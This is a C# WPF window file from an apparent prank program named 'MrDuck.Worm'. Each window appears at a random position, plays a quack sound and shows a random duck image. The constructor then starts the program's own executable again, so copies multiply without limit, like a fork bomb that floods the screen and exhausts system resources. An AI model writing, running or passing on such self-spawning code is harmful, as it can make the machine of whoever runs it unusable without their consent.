using System;
using System.Diagnostics;
using System.Media;
using System.Windows;
using System.Windows.Media.Imaging;
using WpfAnimatedGif;

namespace MrDuck.Worm
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            Random genX = new Random();
            Random genY = new Random();
            DuckWindow.Left = genY.Next(1920);
            DuckWindow.Top = genX.Next(1080);

            PlayQuak();

            // random image.
            Random imageGen = new Random();
            int i = imageGen.Next(1, 4);
            string imageSource = @"../Images/Idle.gif";

            switch (i)
            {
                case 1:
                    imageSource = @"../Images/Idle.gif";
                    break;
                case 2:
                    imageSource = @"../Images/Running.gif";
                    break;
                case 3:
                    imageSource = @"../Images/Dead.png";
                    break;
            }


            // load image
            var image = new BitmapImage();
            image.BeginInit();
            image.UriSource = new Uri(imageSource, UriKind.Relative);
            image.EndInit();
            ImageBehavior.SetAnimatedSource(mainImage, image);


            Process.Start(@"./MrDuck.Worm.exe");

        }

        private void PlayQuak()
        {
            SoundPlayer player = new SoundPlayer(@"./SoundEffects/Quack.wav");
            player.Play();
        }
    }
}
